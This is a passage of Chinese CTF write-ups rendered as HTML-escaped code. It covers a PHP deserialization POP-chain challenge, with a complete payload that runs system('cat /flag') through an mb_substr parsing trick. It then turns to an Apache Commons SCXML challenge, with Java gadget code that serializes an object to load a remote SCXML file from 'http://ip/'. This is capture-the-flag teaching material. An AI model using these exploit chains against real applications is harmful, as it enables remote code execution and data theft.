class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title class_">Hacker</span>(<span class="string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>].<span class="string">&#x27;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$pre</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]:<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">    <span class="variable">$ser_ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$pre</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctf</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_ctf</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;杂鱼~杂鱼~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​先构造POC链</p><p>​最终目标是<code>R-&gt;__invoke()</code>，这需要<code>E-&gt;__isset()</code>触发，又需要<code>F-&gt;__get()</code>触发，再需要<code>T-&gt;__call()</code>触发，再需要<code>C-&gt;__toString()</code>触发，如果<code>Hacker-&gt;__destruct()</code>中的<code>$this-&gt;username</code>是一个对象，便可触发<code>__toString()</code>，至此，链子已经很清晰了</p><p>​但存在<code>__wakeup()</code>对username的覆写，但其下一行存在赋值操作，可使用引用绕过</p><p>​同时程序主动抛出错误，使得<code>__destruct()</code>无法到达，利用GC回收机制绕过</p><p>​链子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title function_ invoke__">R</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;r = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;e = <span class="variable">$r</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;f = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">T</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;t = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$hacker</span> = <span class="keyword">new</span> <span class="title class_">Hacker</span>(<span class="string">&quot;ctfer&quot;</span>);</span><br><span class="line"><span class="variable">$hacker</span>-&gt;end = &amp;<span class="variable">$hacker</span>-&gt;username;</span><br><span class="line"><span class="variable">$hacker</span>-&gt;start = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$exp</span>=<span class="keyword">array</span>(<span class="variable">$hacker</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br><span class="line"><span class="comment"># a:2:&#123;i:0;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;s:1:&quot;r&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:1;N;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a:2:&#123;i:0;O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;T&quot;:1:&#123;s:1:&quot;t&quot;;O:1:&quot;F&quot;:1:&#123;s:1:&quot;f&quot;;O:1:&quot;E&quot;:1:&#123;s:1:&quot;e&quot;;O:1:&quot;R&quot;:1:&#123;s:1:&quot;r&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;end&quot;;s:6:&quot;hacker&quot;;s:8:&quot;username&quot;;R:9;&#125;i:0;N;&#125;</span></span><br></pre></td></tr></table></figure><p>​<code>substrstr()</code>函数会截取<code>serialize($ctf)</code>的值进行反序列化，本地测试一下<code>serialize($ctf)</code>的值，发现为：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;s:<span class="number">211</span>:<span class="string">&quot;&#123;&#123;&#123;a:2:&#123;i:0;O:6:&quot;</span>Hacke<span class="string">r&quot;:3:&#123;s:5:&quot;</span>start<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;O:1:&quot;</span>T<span class="string">&quot;:1:&#123;s:1:&quot;</span>t<span class="string">&quot;;O:1:&quot;</span>F<span class="string">&quot;:1:&#123;s:1:&quot;</span>f<span class="string">&quot;;O:1:&quot;</span>E<span class="string">&quot;:1:&#123;s:1:&quot;</span>e<span class="string">&quot;;O:1:&quot;</span>R<span class="string">&quot;:1:&#123;s:1:&quot;</span><span class="string">r&quot;;s:10:&quot;</span>phpinfo();<span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="string">&quot;;s:6:&quot;</span>hacke<span class="string">r&quot;;s:8:&quot;</span>username<span class="string">&quot;;R:9;&#125;i:0;N;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>​其中<code>O:6:&quot;Hacker&quot;:3:&#123;s:5:&quot;start&quot;;s:208:&quot;&#123;&#123;&#123;`会影响我们的反序列化，是我们不想要的，最后的`&#125;&#125;&#125;&quot;;s:3:&quot;end&quot;;N;s:8:&quot;username&quot;;s:6:&quot;hacker&quot;;&#125;</code>不影响解析，因此可以不用管，经过计算需要截取38个字符</p><p>​利用<code>mb_strpos()</code>和<code>mb_substr()</code>一起使用导致的解析漏洞，以下引用别人博客</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每发送一个<span class="variable">%f0abc</span>，mb_strpos认为是<span class="number">4</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">3</span>个字节，截取<span class="number">3</span>字节</span><br><span class="line">每发送一个<span class="variable">%f0</span><span class="variable">%9</span>fab<span class="punctuation">,</span>mb_strpos认为是<span class="number">3</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">2</span>个字节，截取<span class="number">2</span>字节</span><br><span class="line">每发送一个<span class="variable">%f0</span><span class="variable">%9</span>f<span class="variable">%9</span>fa<span class="punctuation">,</span>mb_strpos认为是<span class="number">2</span>个字节，mb_substr认为是<span class="number">1</span>个字节，相差<span class="number">1</span>个字节，截取<span class="number">1</span>字节</span><br></pre></td></tr></table></figure><p>​因此，最终payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">substr</span>=%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%<span class="number">9</span>fab&amp;ez[ser.from_you=a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">6</span>:<span class="string">&quot;Hacker&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;T&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;t&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;F&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;f&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;e&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;R&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;r&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;system(&quot;</span>cat /flag<span class="string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;R:<span class="number">9</span>;&#125;i:<span class="number">0</span>;N;&#125;</span><br></pre></td></tr></table></figure><h2 id="scxml"><a href="#scxml" class="headerlink" title="scxml"></a>scxml</h2><h3 id="题目描述-30"><a href="#题目描述-30" class="headerlink" title="题目描述"></a>题目描述</h3><p>​<a href="https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/">https://blog.pyn3rd.com/2023/02/06/Apache-Commons-SCXML-Remote-Code-Execution/</a></p><h3 id="考点-30"><a href="#考点-30" class="headerlink" title="考点"></a>考点</h3><ul><li>RCE</li><li>XXE</li></ul><h3 id="题解-30"><a href="#题解-30" class="headerlink" title="题解"></a>题解</h3><p>​以下转自官方WP</p><p>​java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCInstance;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.jexl.JexlEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.event.EventListenerList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.CompoundEdit;</span><br><span class="line"><span class="keyword">import</span> javax.swing.undo.UndoManager;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.AccessibleObject;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AAA</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleSCXMLInvoker</span> <span class="variable">simpleSCXMLInvoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSCXMLInvoker</span>();</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">scxmlExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        scxmlExecutor.setEvaluator(<span class="keyword">new</span> <span class="title class_">JexlEvaluator</span>());</span><br><span class="line">        Constructor&lt;SCInstance&gt; declaredConstructor = SCInstance.class.getDeclaredConstructor(SCXMLExecutor.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">SCInstance</span> <span class="variable">scInstance</span> <span class="operator">=</span> declaredConstructor.newInstance(scxmlExecutor);</span><br><span class="line">        unsafe.putObject(simpleSCXMLInvoker,unsafe.objectFieldOffset(simpleSCXMLInvoker.getClass().getDeclaredField(<span class="string">&quot;parentSCInstance&quot;</span>)),scInstance);</span><br><span class="line">        unsafe.putObject(scInstance,unsafe.objectFieldOffset(scInstance.getClass().getDeclaredField(<span class="string">&quot;evaluator&quot;</span>)),<span class="keyword">new</span> <span class="title class_">JexlEvaluator</span>());</span><br><span class="line">        <span class="type">InvokerImpl</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerImpl</span>(simpleSCXMLInvoker, <span class="string">&quot;http://ip/scxm2.xml&quot;</span>, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">EventListenerList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EventListenerList</span>();</span><br><span class="line">        <span class="type">UndoManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UndoManager</span>();</span><br><span class="line">        bypassModule(AAA.class,CompoundEdit.class);</span><br><span class="line">        <span class="type">Vector</span> <span class="variable">vector</span> <span class="operator">=</span> (Vector) getFieldValue(manager, <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        vector.add(invoker);</span><br><span class="line">        setFieldValue(list2, <span class="string">&quot;listenerList&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao).writeObject(list2);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span 